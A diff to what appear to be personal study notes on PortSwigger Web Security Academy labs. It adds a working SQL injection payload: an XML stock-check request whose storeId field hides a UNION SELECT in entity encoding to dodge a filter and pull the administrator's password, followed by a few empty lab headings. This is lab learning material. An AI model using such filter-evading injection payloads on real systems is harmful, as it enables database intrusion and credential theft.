@@ -1,5 +1,19 @@
 # PORTSWIGGER NOTATKI
 
+## Lab: SQL injection with filter bypass via XML encoding
+Payload:
+```
+<?xml version="1.0" encoding="UTF-8"?>
+  <stockCheck>
+    <productId>
+      3
+    </productId>
+  <storeId>
+    1 &#x55;NION &#x53;ELECT password FROM users WHERE username=&apos;administrator&apos;
+  </storeId>
+</stockCheck>
+```
+
 ## Lab: Inconsistent handling of exceptional input
 ## Lab: Authentication bypass via flawed state machine
 ## Lab: Authentication bypass via encryption oracle
